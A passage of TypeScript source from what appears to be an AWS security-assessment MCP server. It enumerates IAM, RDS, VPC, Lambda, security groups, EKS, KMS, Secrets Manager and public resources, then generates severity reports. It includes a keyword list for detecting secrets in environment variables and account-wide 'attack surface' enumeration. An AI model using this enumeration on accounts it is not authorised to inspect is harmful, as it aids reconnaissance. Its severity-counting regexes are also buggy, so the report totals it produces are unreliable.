    output += `## ${role.RoleName}\n`;
    output += `- **ARN:** ${role.Arn}\n`;
    output += `- **Created:** ${role.CreateDate?.toISOString()}\n`;
    output += `- **Max Session Duration:** ${role.MaxSessionDuration ? `${role.MaxSessionDuration / 3600} hours` : "N/A"}\n`;

    // Check trust policy for wildcards
    const trustPolicy = role.AssumeRolePolicyDocument ? JSON.parse(decodeURIComponent(role.AssumeRolePolicyDocument)) : null;
    if (trustPolicy && JSON.stringify(trustPolicy).includes("*")) {
      findings.push(`[CRITICAL] CRITICAL: Role ${role.RoleName} has wildcard (*) in trust policy - potential privilege escalation risk`);
    }

    output += `\n`;
  }

  if (findings.length > 0) {
    output += `## Security Findings\n`;
    findings.forEach(f => output += `${f}\n`);
  }

  // Cache for 10 minutes - IAM changes rarely
  cache.set(cacheKey, output, 600000);

  return output;
}

// Multi-region RDS enumeration
async function enumerateRDSDatabasesMultiRegion(region: string): Promise<string> {
  const regions = resolveRegions(region);
  
  if (regions.length === 1) {
    return enumerateRDSDatabases(regions[0]);
  }
  
  let output = `# RDS Databases - Multi-Region Scan\n\n`;
  output += `**Scanning ${regions.length} regions:** ${region === 'all' ? 'ALL' : region === 'common' ? 'COMMON' : region}\n\n`;
  
  let totalDBs = 0;
  const allFindings: string[] = [];
  
  for (const r of regions) {
    try {
      const client = new RDSClient({ region: r });
      const command = new DescribeDBInstancesCommand({});
      const response = await client.send(command);
      
      if (response.DBInstances && response.DBInstances.length > 0) {
        output += `## Region: ${r}\n\n`;
        
        for (const db of response.DBInstances) {
          totalDBs++;
          const dbId = db.DBInstanceIdentifier || "N/A";
          const engine = db.Engine || "N/A";
          const publicAccess = db.PubliclyAccessible ? "[CRITICAL] PUBLIC" : "[OK] Private";
          const encrypted = db.StorageEncrypted ? "[OK] Yes" : "[FAIL] No";
          
          output += `- **${dbId}** (${engine}) | ${publicAccess} | Encrypted: ${encrypted}\n`;
          
          if (db.PubliclyAccessible) {
            allFindings.push(`[CRITICAL] ${r}: RDS ${dbId} is publicly accessible`);
          }
          if (!db.StorageEncrypted) {
            allFindings.push(`[HIGH] ${r}: RDS ${dbId} is not encrypted`);
          }
        }
        output += `\n`;
      }
    } catch (error: any) {
      // Skip regions with access issues
    }
  }
  
  output += `## Summary\n**Total Databases:** ${totalDBs}\n\n`;
  
  if (allFindings.length > 0) {
    output += `## Security Findings (${allFindings.length})\n\n`;
    allFindings.forEach(f => output += `${f}\n`);
  }
  
  if (totalDBs === 0) {
    output += `\n[OK] No RDS databases found across ${regions.length} regions.\n`;
  }
  
  return output;
}

async function enumerateRDSDatabases(region: string): Promise<string> {
  const client = new RDSClient({ region });
  
  // Get DB instances
  const instancesCommand = new DescribeDBInstancesCommand({});
  const instancesResponse = await client.send(instancesCommand);

  // Get DB clusters
  const clustersCommand = new DescribeDBClustersCommand({});
  const clustersResponse = await client.send(clustersCommand);

  const totalInstances = instancesResponse.DBInstances?.length || 0;
  const totalClusters = clustersResponse.DBClusters?.length || 0;

  if (totalInstances === 0 && totalClusters === 0) {
    return `No RDS databases found in ${region}`;
  }

  let output = `# RDS Databases in ${region}\n\n`;
  output += `**Instances:** ${totalInstances} | **Clusters:** ${totalClusters}\n\n`;
  const findings: string[] = [];

  // Process instances
  for (const db of instancesResponse.DBInstances || []) {
    output += `## Instance: ${db.DBInstanceIdentifier}\n`;
    output += `- **Engine:** ${db.Engine} ${db.EngineVersion}\n`;
    output += `- **Status:** ${db.DBInstanceStatus}\n`;
    output += `- **Publicly Accessible:** ${db.PubliclyAccessible ? "[WARN] YES" : "[OK] No"}\n`;
    output += `- **Encrypted:** ${db.StorageEncrypted ? "[OK] Yes" : "[FAIL] No"}\n`;
    output += `- **Multi-AZ:** ${db.MultiAZ ? "[OK] Yes" : "[FAIL] No"}\n`;
    output += `- **Backup Retention:** ${db.BackupRetentionPeriod} days\n\n`;

    if (db.PubliclyAccessible) {
      findings.push(`[CRITICAL] CRITICAL: RDS instance ${db.DBInstanceIdentifier} is publicly accessible - exposed to Internet`);
    }
    if (!db.StorageEncrypted) {
      findings.push(`[HIGH] HIGH: RDS instance ${db.DBInstanceIdentifier} not encrypted at rest`);
    }
    if ((db.BackupRetentionPeriod || 0) < 7) {
      findings.push(`[MEDIUM] MEDIUM: RDS instance ${db.DBInstanceIdentifier} has insufficient backup retention (${db.BackupRetentionPeriod} days)`);
    }
  }

  // Process clusters
  for (const cluster of clustersResponse.DBClusters || []) {
    output += `## Cluster: ${cluster.DBClusterIdentifier}\n`;
    output += `- **Engine:** ${cluster.Engine} ${cluster.EngineVersion}\n`;
    output += `- **Status:** ${cluster.Status}\n`;
    output += `- **Encrypted:** ${cluster.StorageEncrypted ? "[OK] Yes" : "[FAIL] No"}\n`;
    output += `- **Members:** ${cluster.DBClusterMembers?.length || 0}\n\n`;

    if (!cluster.StorageEncrypted) {
      findings.push(`[HIGH] HIGH: RDS cluster ${cluster.DBClusterIdentifier} not encrypted at rest`);
    }
  }

  if (findings.length > 0) {
    output += `## Security Findings (${findings.length})\n`;
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

async function enumerateVPCs(region: string): Promise<string> {
  const client = new EC2Client({ region });
  const vpcsCommand = new DescribeVpcsCommand({});
  const vpcsResponse = await client.send(vpcsCommand);

  if (!vpcsResponse.Vpcs || vpcsResponse.Vpcs.length === 0) {
    return `No VPCs found in ${region}`;
  }

  let output = `# VPCs in ${region}\n\n**Total VPCs:** ${vpcsResponse.Vpcs.length}\n\n`;

  for (const vpc of vpcsResponse.Vpcs) {
    output += `## VPC: ${vpc.VpcId}\n`;
    output += `- **CIDR Block:** ${vpc.CidrBlock}\n`;
    output += `- **Default VPC:** ${vpc.IsDefault ? "Yes" : "No"}\n`;
    output += `- **State:** ${vpc.State}\n`;

    // Get subnets
    const subnetsCommand = new DescribeSubnetsCommand({ Filters: [{ Name: "vpc-id", Values: [vpc.VpcId!] }] });
    const subnetsResponse = await client.send(subnetsCommand);
    
    output += `- **Subnets:** ${subnetsResponse.Subnets?.length || 0}\n`;
    
    let publicSubnets = 0;
    for (const subnet of subnetsResponse.Subnets || []) {
      if (subnet.MapPublicIpOnLaunch) publicSubnets++;
    }
    output += `- **Public Subnets:** ${publicSubnets}\n\n`;
  }

  return output;
}

async function enumerateLambdaFunctions(region: string): Promise<string> {
  const client = new LambdaClient({ region });
  const command = new ListFunctionsCommand({});
  const response = await client.send(command);

  if (!response.Functions || response.Functions.length === 0) {
    return `No Lambda functions found in ${region}`;
  }

  let output = `# Lambda Functions in ${region}\n\n**Total Functions:** ${response.Functions.length}\n\n`;
  const findings: string[] = [];

  for (const func of response.Functions) {
    output += `## ${func.FunctionName}\n`;
    output += `- **Runtime:** ${func.Runtime}\n`;
    output += `- **Handler:** ${func.Handler}\n`;
    output += `- **IAM Role:** ${func.Role?.split("/").pop()}\n`;
    output += `- **Memory:** ${func.MemorySize} MB\n`;
    output += `- **Timeout:** ${func.Timeout} seconds\n`;
    output += `- **Last Modified:** ${func.LastModified}\n`;

    // Check for old runtimes
    if (func.Runtime?.includes("python2") || func.Runtime?.includes("node10") || func.Runtime?.includes("node12")) {
      findings.push(`[CRITICAL] CRITICAL: Lambda ${func.FunctionName} uses deprecated runtime ${func.Runtime} - security risk`);
    }

    // Check environment variables
    if (func.Environment?.Variables && Object.keys(func.Environment.Variables).length > 0) {
      const envVars = Object.keys(func.Environment.Variables);
      output += `- **Environment Variables:** ${envVars.length} (${envVars.join(", ")})\n`;
      
      // Check for potential secrets in env vars
      const sensitiveKeys = ["PASSWORD", "SECRET", "KEY", "TOKEN", "API_KEY"];
      const hasSensitiveKeys = envVars.some(key => sensitiveKeys.some(s => key.toUpperCase().includes(s)));
      if (hasSensitiveKeys) {
        findings.push(`[HIGH] HIGH: Lambda ${func.FunctionName} may have secrets in environment variables - use Secrets Manager instead`);
      }
    }

    output += `\n`;
  }

  if (findings.length > 0) {
    output += `## Security Findings (${findings.length})\n`;
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

async function analyzeSecurityGroups(region: string): Promise<string> {
  const client = new EC2Client({ region });
  const command = new DescribeSecurityGroupsCommand({});
  const response = await client.send(command);

  if (!response.SecurityGroups || response.SecurityGroups.length === 0) {
    return `No security groups found in ${region}`;
  }

  let output = `# Security Groups Analysis - ${region}\n\n**Total Security Groups:** ${response.SecurityGroups.length}\n\n`;
  const findings: string[] = [];
  const dangerousPorts = [22, 3389, 445, 3306, 5432, 27017, 6379, 9200, 5601, 1433];
  const portNames: Record<number, string> = {
    22: "SSH", 3389: "RDP", 445: "SMB", 3306: "MySQL", 5432: "PostgreSQL",
    27017: "MongoDB", 6379: "Redis", 9200: "Elasticsearch", 5601: "Kibana", 1433: "SQL Server"
  };

  for (const sg of response.SecurityGroups) {
    let hasFindings = false;
    let sgOutput = `## ${sg.GroupName} (${sg.GroupId})\n`;
    sgOutput += `- **VPC:** ${sg.VpcId || "EC2-Classic"}\n`;
    sgOutput += `- **Description:** ${sg.Description}\n`;

    // Analyze ingress rules
    for (const rule of sg.IpPermissions || []) {
      const fromPort = rule.FromPort;
      const toPort = rule.ToPort;
      const protocol = rule.IpProtocol === "-1" ? "All" : rule.IpProtocol;

      // Check for 0.0.0.0/0 access
      const hasPublicAccess = rule.IpRanges?.some(range => range.CidrIp === "0.0.0.0/0") || false;
      
      if (hasPublicAccess) {
        if (rule.IpProtocol === "-1") {
          findings.push(`[CRITICAL] CRITICAL: ${sg.GroupName} (${sg.GroupId}) allows ALL traffic from Internet (0.0.0.0/0)`);
          hasFindings = true;
        } else if (fromPort && dangerousPorts.includes(fromPort)) {
          const portName = portNames[fromPort] || fromPort.toString();
          findings.push(`[CRITICAL] CRITICAL: ${sg.GroupName} (${sg.GroupId}) exposes ${portName} (port ${fromPort}) to Internet`);
          hasFindings = true;
        } else if (fromPort === 0 && toPort === 65535) {
          findings.push(`[CRITICAL] CRITICAL: ${sg.GroupName} (${sg.GroupId}) allows all ports from Internet`);
          hasFindings = true;
        }
      }
    }

    if (hasFindings) {
      output += sgOutput + `\n`;
    }
  }

  output += `\n## Security Findings (${findings.length})\n`;
  if (findings.length === 0) {
    output += `[OK] No critical security group misconfigurations found\n`;
  } else {
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

async function checkIAMPolicies(policyArn?: string): Promise<string> {
  let output = `# IAM Policies Analysis\n\n`;
  const findings: string[] = [];

  if (policyArn) {
    // Analyze specific policy
    output += `Analyzing policy: ${policyArn}\n\n`;
    // Policy analysis would go here
    return output + "[OK] Policy analysis complete";
  }

  // List all customer managed policies
  const command = new ListPoliciesCommand({ Scope: "Local" });
  const response = await iamClient.send(command);

  if (!response.Policies || response.Policies.length === 0) {
    return "No customer-managed policies found";
  }

  output += `**Total Customer Policies:** ${response.Policies.length}\n\n`;

  for (const policy of response.Policies) {
    output += `## ${policy.PolicyName}\n`;
    output += `- **ARN:** ${policy.Arn}\n`;
    output += `- **Attachment Count:** ${policy.AttachmentCount}\n`;
    output += `- **Created:** ${policy.CreateDate?.toISOString()}\n`;

    // Get policy document
    if (policy.DefaultVersionId) {
      try {
        const versionCommand = new GetPolicyVersionCommand({
          PolicyArn: policy.Arn!,
          VersionId: policy.DefaultVersionId
        });
        const versionResponse = await iamClient.send(versionCommand);
        const policyDoc = versionResponse.PolicyVersion?.Document ? 
          JSON.parse(decodeURIComponent(versionResponse.PolicyVersion.Document)) : null;

        // Check for wildcards
        const docString = JSON.stringify(policyDoc);
        if (docString.includes('"Action":"*"') || docString.includes('"Resource":"*"')) {
          findings.push(`[CRITICAL] CRITICAL: Policy ${policy.PolicyName} contains wildcard permissions - potential privilege escalation`);
        }
        if (docString.includes(':iam:') && (docString.includes('AttachUserPolicy') || docString.includes('CreateAccessKey'))) {
          findings.push(`[HIGH] HIGH: Policy ${policy.PolicyName} can modify IAM - privilege escalation risk`);
        }
      } catch (error) {
        // Skip if can't read policy
      }
    }

    output += `\n`;
  }

  output += `## Security Findings (${findings.length})\n`;
  if (findings.length === 0) {
    output += `[OK] No overly permissive policies detected\n`;
  } else {
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

async function enumerateEKSClusters(region: string): Promise<string> {
  const client = new EKSClient({ region });
  const listCommand = new ListClustersCommand({});
  const listResponse = await client.send(listCommand);

  if (!listResponse.clusters || listResponse.clusters.length === 0) {
    return `No EKS clusters found in ${region}`;
  }

  let output = `# EKS Clusters in ${region}\n\n**Total Clusters:** ${listResponse.clusters.length}\n\n`;
  const findings: string[] = [];

  for (const clusterName of listResponse.clusters) {
    const describeCommand = new DescribeClusterCommand({ name: clusterName });
    const cluster = (await client.send(describeCommand)).cluster;

    if (!cluster) continue;

    output += `## ${cluster.name}\n`;
    output += `- **Status:** ${cluster.status}\n`;
    output += `- **Version:** ${cluster.version}\n`;
    output += `- **Endpoint:** ${cluster.endpoint}\n`;
    output += `- **Platform Version:** ${cluster.platformVersion}\n`;
    
    // Check public endpoint
    const isPublic = cluster.resourcesVpcConfig?.endpointPublicAccess;
    output += `- **Public Endpoint:** ${isPublic ? "[WARN] Enabled" : "[OK] Disabled"}\n`;
    
    // Check network configuration
    const publicCidrs = cluster.resourcesVpcConfig?.publicAccessCidrs || [];
    if (isPublic && publicCidrs.includes("0.0.0.0/0")) {
      findings.push(`[CRITICAL] CRITICAL: EKS cluster ${cluster.name} API server accessible from Internet (0.0.0.0/0)`);
    }

    output += `- **Logging Enabled:** ${cluster.logging?.clusterLogging?.some(l => l.enabled) ? "[OK] Yes" : "[FAIL] No"}\n`;
    
    if (!cluster.logging?.clusterLogging?.some(l => l.enabled)) {
      findings.push(`[MEDIUM] MEDIUM: EKS cluster ${cluster.name} has no control plane logging enabled`);
    }

    output += `\n`;
  }

  output += `## Security Findings (${findings.length})\n`;
  if (findings.length === 0) {
    output += `[OK] No critical EKS security issues found\n`;
  } else {
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

async function checkKMSKeys(region: string): Promise<string> {
  const client = new KMSClient({ region });
  const listCommand = new ListKeysCommand({});
  const listResponse = await client.send(listCommand);

  if (!listResponse.Keys || listResponse.Keys.length === 0) {
    return `No KMS keys found in ${region}`;
  }

  let output = `# KMS Keys in ${region}\n\n**Total Keys:** ${listResponse.Keys.length}\n\n`;
  const findings: string[] = [];

  for (const key of listResponse.Keys) {
    try {
      const describeCommand = new DescribeKeyCommand({ KeyId: key.KeyId });
      const keyMetadata = (await client.send(describeCommand)).KeyMetadata;

      if (!keyMetadata || keyMetadata.KeyManager === "AWS") continue; // Skip AWS-managed keys

      output += `## ${keyMetadata.Description || keyMetadata.KeyId}\n`;
      output += `- **Key ID:** ${keyMetadata.KeyId}\n`;
      output += `- **State:** ${keyMetadata.KeyState}\n`;
      output += `- **Enabled:** ${keyMetadata.Enabled ? "[OK] Yes" : "[FAIL] No"}\n`;
      output += `- **Created:** ${keyMetadata.CreationDate?.toISOString()}\n`;

      // Note: Key rotation status requires separate GetKeyRotationStatus API call
      output += `[TIP] Use GetKeyRotationStatus API to check rotation\n`;

      output += `\n`;
    } catch (error) {
      // Skip keys we can't describe
    }
  }

  output += `## Security Findings (${findings.length})\n`;
  if (findings.length === 0) {
    output += `[OK] No KMS key security issues found\n`;
  } else {
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

async function scanSecretsManager(region: string): Promise<string> {
  const client = new SecretsManagerClient({ region });
  const listCommand = new ListSecretsCommand({});
  const listResponse = await client.send(listCommand);

  if (!listResponse.SecretList || listResponse.SecretList.length === 0) {
    return `No secrets found in Secrets Manager (${region})`;
  }

  let output = `# Secrets Manager - ${region}\n\n**Total Secrets:** ${listResponse.SecretList.length}\n\n`;
  const findings: string[] = [];

  for (const secret of listResponse.SecretList) {
    output += `## ${secret.Name}\n`;
    output += `- **ARN:** ${secret.ARN}\n`;
    output += `- **Description:** ${secret.Description || "N/A"}\n`;
    output += `- **Rotation Enabled:** ${secret.RotationEnabled ? "[OK] Yes" : "[WARN] No"}\n`;
    output += `- **Last Changed:** ${secret.LastChangedDate?.toISOString() || "N/A"}\n`;
    output += `- **Last Accessed:** ${secret.LastAccessedDate?.toISOString() || "Never"}\n`;

    if (!secret.RotationEnabled) {
      findings.push(`[MEDIUM] MEDIUM: Secret ${secret.Name} does not have automatic rotation enabled`);
    }

    const daysSinceChange = secret.LastChangedDate ? 
      Math.floor((Date.now() - secret.LastChangedDate.getTime()) / (1000 * 60 * 60 * 24)) : 999;
    if (daysSinceChange > 90) {
      findings.push(`[HIGH] HIGH: Secret ${secret.Name} hasn't been rotated in ${daysSinceChange} days`);
    }

    output += `\n`;
  }

  output += `## Security Findings (${findings.length})\n`;
  if (findings.length === 0) {
    output += `[OK] All secrets properly configured\n`;
  } else {
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

// Multi-region Public Resources enumeration
async function enumeratePublicResourcesMultiRegion(region: string): Promise<string> {
  const regions = resolveRegions(region);
  
  if (regions.length === 1) {
    return enumeratePublicResources(regions[0]);
  }
  
  let output = `# Public Resources - Multi-Region Attack Surface\n\n`;
  output += `**Scanning ${regions.length} regions:** ${region === 'all' ? 'ALL' : region === 'common' ? 'COMMON' : region}\n\n`;
  
  let totalPublic = 0;
  const allFindings: string[] = [];
  
  for (const r of regions) {
    try {
      const regionResult = await enumeratePublicResources(r);
      
      // Extract public resource count from result
      const ec2Match = regionResult.match(/Public EC2 Instances: (\d+)/);
      const rdsMatch = regionResult.match(/Public RDS Instances: (\d+)/);
      
      const ec2Count = ec2Match ? parseInt(ec2Match[1]) : 0;
      const rdsCount = rdsMatch ? parseInt(rdsMatch[1]) : 0;
      
      if (ec2Count > 0 || rdsCount > 0) {
        output += `## Region: ${r}\n\n`;
        output += regionResult.replace(/# Public Resources.*\n\n/g, '');
        output += `\n---\n\n`;
        totalPublic += ec2Count + rdsCount;
        
        if (ec2Count > 0) allFindings.push(`[CRITICAL] ${r}: ${ec2Count} public EC2 instances`);
        if (rdsCount > 0) allFindings.push(`[CRITICAL] ${r}: ${rdsCount} public RDS instances`);
      }
    } catch (error: any) {
      // Skip regions with access issues
    }
  }
  
  output += `## Summary\n\n`;
  output += `**Total Public Resources:** ${totalPublic}\n\n`;
  
  if (allFindings.length > 0) {
    output += `## Critical Findings\n\n`;
    allFindings.forEach(f => output += `${f}\n`);
  } else {
    output += `[OK] No publicly accessible resources found across ${regions.length} regions.\n`;
  }
  
  return output;
}

async function enumeratePublicResources(region: string): Promise<string> {
  let output = `# Public Resources - Attack Surface Mapping (${region})\n\n`;
  const publicResources: string[] = [];

  // Find EC2 instances with public IPs
  const ec2Client = new EC2Client({ region });
  const ec2Command = new DescribeInstancesCommand({});
  const ec2Response = await ec2Client.send(ec2Command);

  let publicEC2Count = 0;
  for (const reservation of ec2Response.Reservations || []) {
    for (const instance of reservation.Instances || []) {
      if (instance.PublicIpAddress) {
        publicEC2Count++;
        publicResources.push(`[CRITICAL] EC2 Instance ${instance.InstanceId} - Public IP: ${instance.PublicIpAddress}`);
      }
    }
  }

  output += `## Public EC2 Instances: ${publicEC2Count}\n\n`;
  
  // Find publicly accessible RDS
  const rdsClient = new RDSClient({ region });
  const rdsCommand = new DescribeDBInstancesCommand({});
  const rdsResponse = await rdsClient.send(rdsCommand);

  let publicRDSCount = 0;
  for (const db of rdsResponse.DBInstances || []) {
    if (db.PubliclyAccessible) {
      publicRDSCount++;
      publicResources.push(`[CRITICAL] RDS Instance ${db.DBInstanceIdentifier} - Publicly Accessible`);
    }
  }

  output += `## Public RDS Instances: ${publicRDSCount}\n\n`;

  // Find public S3 buckets (already implemented in scan_s3_bucket_security)
  output += `## Public S3 Buckets\n[TIP] Use scan_s3_bucket_security to check individual bucket public access\n\n`;

  output += `## Total Public Resources Found: ${publicEC2Count + publicRDSCount}\n\n`;

  if (publicResources.length > 0) {
    output += `## Attack Surface Details\n`;
    publicResources.forEach(r => output += `${r}\n`);
  } else {
    output += `[OK] No publicly accessible resources found\n`;
  }

  return output;
}

async function generateSecurityReport(region: string, format: string = "markdown", outputFile?: string): Promise<string> {
  const findings: any[] = [];
  let criticalCount = 0, highCount = 0, mediumCount = 0, lowCount = 0;

  // Collect findings from all tools
  try {
    // EC2 findings
    const ec2Result = await enumerateEC2Instances(region);
    if (ec2Result.includes("CRITICAL")) criticalCount++;
    if (ec2Result.includes("HIGH")) highCount++;
    findings.push({ category: "EC2", data: ec2Result });

    // Security Group findings
    const sgResult = await analyzeSecurityGroups(region);
    const sgCritical = (sgResult.match(/[CRITICAL] CRITICAL/g) || []).length;
    criticalCount += sgCritical;
    findings.push({ category: "Security Groups", data: sgResult });

    // RDS findings
    const rdsResult = await enumerateRDSDatabases(region);
    const rdsCritical = (rdsResult.match(/[CRITICAL] CRITICAL/g) || []).length;
    const rdsHigh = (rdsResult.match(/[HIGH] HIGH/g) || []).length;
    criticalCount += rdsCritical;
    highCount += rdsHigh;
    findings.push({ category: "RDS Databases", data: rdsResult });

    // Public resources
    const publicResult = await enumeratePublicResources(region);
    const publicCritical = (publicResult.match(/[CRITICAL]/g) || []).length;
    criticalCount += publicCritical;
    findings.push({ category: "Public Resources", data: publicResult });

  } catch (error: any) {
    findings.push({ category: "Error", data: `Error collecting findings: ${error.message}` });
  }

  // Generate markdown report
  let report = `# AWS Security Assessment Report\n\n`;
  report += `**Region:** ${region}\n`;
  report += `**Scan Date:** ${new Date().toISOString()}\n`;
  report += `**Generated By:** Nimbus v1.4.2\n\n`;

  report += `## Executive Summary\n\n`;
  report += `**Total Findings:** ${criticalCount + highCount + mediumCount + lowCount}\n`;
  report += `- [CRITICAL] **CRITICAL:** ${criticalCount}\n`;
  report += `- [HIGH] **HIGH:** ${highCount}\n`;
  report += `- [MEDIUM] **MEDIUM:** ${mediumCount}\n`;
  report += `- [LOW] **LOW:** ${lowCount}\n\n`;

  report += `## Risk Assessment\n`;
  if (criticalCount > 0) {
    report += `**Overall Risk Level:** [CRITICAL] CRITICAL\n\n`;
  } else if (highCount > 0) {
    report += `**Overall Risk Level:** [HIGH] HIGH\n\n`;
  } else {
    report += `**Overall Risk Level:** [LOW] LOW\n\n`;
  }

  report += `## Detailed Findings\n\n`;
  findings.forEach(finding => {
    report += `### ${finding.category}\n\n`;
    report += `${finding.data}\n\n`;
    report += `---\n\n`;
  });

  // Handle different formats
  if (format === "pdf" && outputFile) {
    await generatePDFReport(report, outputFile, { 
      region, 
      criticalCount, 
      highCount, 
      mediumCount, 
      lowCount, 
      findings 
    });
    return `[OK] PDF report generated: ${outputFile}\n\nTotal findings: ${criticalCount + highCount + mediumCount + lowCount}\n[CRITICAL] Critical: ${criticalCount}\n[HIGH] High: ${highCount}`;
  } else if (format === "html" && outputFile) {
    await generateHTMLReport(report, outputFile);
    return `[OK] HTML report generated: ${outputFile}\n\n${report}`;
  } else if (format === "csv" && outputFile) {
    await generateCSVReport(findings, outputFile);
    return `[OK] CSV report generated: ${outputFile}\n\n${report}`;
  }

  return report;
}

async function generatePDFReport(
  markdown: string, 
  outputPath: string, 
  metadata?: { region: string; criticalCount: number; highCount: number; mediumCount: number; lowCount: number; findings: any[] }
): Promise<void> {
  const doc = new PDFDocument({ margin: 50 });
  const stream = fs.createWriteStream(outputPath);
  doc.pipe(stream);

  // Title with AWS Orange color
  doc.fontSize(24).fillColor('#FF9900').text('AWS Security Assessment Report', { align: 'center' });
  doc.moveDown();

  // Metadata
  const scanDate = new Date().toLocaleDateString();
  doc.fontSize(10).fillColor('#666')
    .text(`Region: ${metadata?.region || 'N/A'}`, { continued: true })
    .text(`  |  Scan Date: ${scanDate}`, { continued: true })
    .text(`  |  Generated By: Nimbus v1.4.2`);
  doc.moveDown(2);

  // Executive Summary Box
  doc.fontSize(16).fillColor('#232F3E').text('Executive Summary');
  doc.moveDown(0.5);
  
  const total = (metadata?.criticalCount || 0) + (metadata?.highCount || 0) + (metadata?.mediumCount || 0) + (metadata?.lowCount || 0);
  doc.fontSize(12).fillColor('#000').text(`Total Findings: ${total}`);
  doc.fillColor('#D13212').text(`[CRITICAL] CRITICAL: ${metadata?.criticalCount || 0}`);
  doc.fillColor('#FF9900').text(`[HIGH] HIGH: ${metadata?.highCount || 0}`);
  doc.fillColor('#FFA500').text(`[MEDIUM] MEDIUM: ${metadata?.mediumCount || 0}`);
  doc.fillColor('#1D8102').text(`[LOW] LOW: ${metadata?.lowCount || 0}`);
  doc.moveDown(2);

  // Risk Assessment
  doc.fontSize(16).fillColor('#232F3E').text('Risk Assessment');
  doc.moveDown(0.5);
  
  let riskLevel = 'LOW';
  let riskColor = '#1D8102';
  if ((metadata?.criticalCount || 0) > 0) {
    riskLevel = 'CRITICAL';
    riskColor = '#D13212';
  } else if ((metadata?.highCount || 0) > 0) {
    riskLevel = 'HIGH';
    riskColor = '#FF9900';
  }
  doc.fontSize(14).fillColor(riskColor).text(`Overall Risk Level: ${riskLevel}`);
  doc.moveDown(2);

  // Detailed Findings
  doc.fontSize(16).fillColor('#232F3E').text('Detailed Findings');
  doc.moveDown();

  if (metadata?.findings) {
    for (const finding of metadata.findings) {
      doc.fontSize(14).fillColor('#FF9900').text(` ${finding.category}`);
      doc.moveDown(0.5);
      
      // Parse findings from data
      const lines = finding.data.split('\n').slice(0, 20); // Limit lines per category
      for (const line of lines) {
        if (line.includes('[CRITICAL] CRITICAL')) {
          doc.fontSize(10).fillColor('#D13212').text(line.replace(/[#*]/g, '').trim());
        } else if (line.includes('[HIGH] HIGH')) {
          doc.fontSize(10).fillColor('#FF9900').text(line.replace(/[#*]/g, '').trim());
        } else if (line.includes('[MEDIUM] MEDIUM')) {
          doc.fontSize(10).fillColor('#FFA500').text(line.replace(/[#*]/g, '').trim());
        } else if (line.includes('[LOW]') || line.includes('[OK]')) {
          doc.fontSize(10).fillColor('#1D8102').text(line.replace(/[#*]/g, '').trim());
        } else if (line.trim() && !line.startsWith('#')) {
          doc.fontSize(10).fillColor('#000').text(line.replace(/[#*]/g, '').trim());
        }
      }
      doc.moveDown();
    }
  } else {
    // Fallback: parse markdown sections
    const sections = markdown.split('###').slice(1);
    for (const section of sections) {
      const lines = section.split('\n');
      const title = lines[0]?.trim() || 'Finding';
      doc.fontSize(14).fillColor('#FF9900').text(` ${title}`);
      doc.moveDown(0.5);
      
      for (const line of lines.slice(1, 15)) {
        if (line.includes('CRITICAL')) {
          doc.fontSize(10).fillColor('#D13212').text(line.replace(/[#*-]/g, '').trim());
        } else if (line.includes('HIGH')) {
          doc.fontSize(10).fillColor('#FF9900').text(line.replace(/[#*-]/g, '').trim());
        } else if (line.trim() && !line.startsWith('---')) {
          doc.fontSize(10).fillColor('#000').text(line.replace(/[#*-]/g, '').trim());
        }
      }
      doc.moveDown();
    }
  }

  // Footer
  doc.moveDown(2);
  doc.fontSize(8).fillColor('#666')
    .text('Generated by Nimbus - AWS Security Assessment MCP v1.4.2', { align: 'center' })
    .text('https://github.com/jaikumar3/nimbus-mcp', { align: 'center' });

  doc.end();

  return new Promise((resolve, reject) => {
    stream.on("finish", resolve);
    stream.on("error", reject);
  });
}

async function generateHTMLReport(markdown: string, outputPath: string): Promise<void> {
  const html = `<!DOCTYPE html>
<html>
<head>
  <title>AWS Security Report</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; }
    h1 { color: #232F3E; border-bottom: 3px solid #FF9900; }
    h2 { color: #FF9900; }
    .critical { color: #D13212; font-weight: bold; }
    .high { color: #FF9900; font-weight: bold; }
    .medium { color: #FFA500; }
    .low { color: #1D8102; }
  </style>
</head>
<body>
  ${await marked(markdown)}
</body>
</html>`;
  
  fs.writeFileSync(outputPath, html);
}

async function generateCSVReport(findings: any[], outputPath: string): Promise<void> {
  const records = findings.map(f => ({
    category: f.category,
    summary: f.data.substring(0, 200).replace(/\n/g, " ")
  }));

  const csvWriter = createObjectCsvWriter({
    path: outputPath,
    header: [
      { id: "category", title: "Category" },
      { id: "summary", title: "Summary" }
    ]
  });

  await csvWriter.writeRecords(records);
}

// ============ NEW SERVICE SECURITY SCANNERS ============

async function scanDynamoDBSecurity(region: string, tableName?: string): Promise<string> {
  const client = new DynamoDBClient({ region });
  let output = "# DynamoDB Security Analysis\n\n";
  
  try {
    const listCmd = new ListTablesCommand({});
    const tables = await client.send(listCmd);
    
    if (!tables.TableNames || tables.TableNames.length === 0) {
      return output + "[OK] No DynamoDB tables found in region.\n";
    }
    
    const tablesToScan = tableName ? [tableName] : tables.TableNames;
    let criticalCount = 0, highCount = 0, mediumCount = 0;
    
    for (const table of tablesToScan) {
      output += `\n## Table: ${table}\n`;
      const findings: string[] = [];
      
      try {
        const descCmd = new DescribeTableCommand({ TableName: table });
        const tableDesc = await client.send(descCmd);
        
        // Check encryption
        if (!tableDesc.Table?.SSEDescription || tableDesc.Table.SSEDescription.Status !== "ENABLED") {
          findings.push("[CRITICAL] CRITICAL: Encryption at rest NOT enabled");
          criticalCount++;
        } else {
          findings.push(`[LOW] Encryption: ${tableDesc.Table.SSEDescription.SSEType} (${tableDesc.Table.SSEDescription.Status})`);
        }
        
        // Check point-in-time recovery
        const backupCmd = new DescribeContinuousBackupsCommand({ TableName: table });
        const backup = await client.send(backupCmd);
        
        if (backup.ContinuousBackupsDescription?.PointInTimeRecoveryDescription?.PointInTimeRecoveryStatus !== "ENABLED") {
          findings.push("[HIGH] HIGH: Point-in-time recovery NOT enabled (data loss risk)");
          highCount++;
        } else {
          findings.push("[LOW] Point-in-time recovery: ENABLED");
        }
        
        // Check billing mode
        const billingMode = tableDesc.Table?.BillingModeSummary?.BillingMode || "PROVISIONED";
        findings.push(`[MEDIUM] Billing Mode: ${billingMode}`);
        
        // Check table status
        findings.push(`Status: ${tableDesc.Table?.TableStatus}`);
